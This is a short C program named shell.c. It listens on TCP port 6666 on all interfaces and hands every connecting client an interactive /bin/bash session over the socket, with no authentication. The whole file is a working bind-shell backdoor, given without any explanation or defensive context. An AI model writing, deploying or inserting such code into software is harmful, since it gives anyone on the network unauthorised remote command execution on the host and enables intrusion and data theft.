/*
 * ------------------------------------------------------------------------
 *   File Name: shell.c
 *      Author: Zhao Yanbai
 *              Fri Apr 10 11:14:22 2015
 * Description: none
 * ------------------------------------------------------------------------
 */
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<arpa/inet.h>
#include<netinet/in.h>


#define PORT 6666

void do_child(int fd)
{
    printf("new connection: %d\n", fd);

    close(STDIN_FILENO);
    dup(fd);

    close(STDOUT_FILENO);
    dup(fd);

    close(STDERR_FILENO);
    dup(fd);


    execvp("/bin/bash", 0);
}

int main()
{
	int sock;
	struct sockaddr_in serv;

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if(sock == -1)
	{
		perror("socket failed");
		exit(1);
	}


	int flags;
	setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &flags, sizeof(flags));


	serv.sin_family		    = AF_INET;
	serv.sin_addr.s_addr	= htonl(INADDR_ANY);
	serv.sin_port		    = htons(PORT);
	if(bind(sock, (struct sockaddr*)&serv, sizeof(serv)) == -1)
	{
		perror("bind failed");
		exit(1);
	}


	if(listen(sock, SOMAXCONN) == -1)
	{
		perror("listen failed");
		exit(1);
	}


	while(1)
	{
        int nfd;
        struct sockaddr_in client;
        socklen_t len = sizeof(client);
		nfd = accept(sock, (struct sockaddr *)&client, &len);

        pid_t pid = fork();

		if(pid ==0)
		{
            do_child(nfd);
            exit(0);
		}
	}

	close(sock);

	return 0;
}
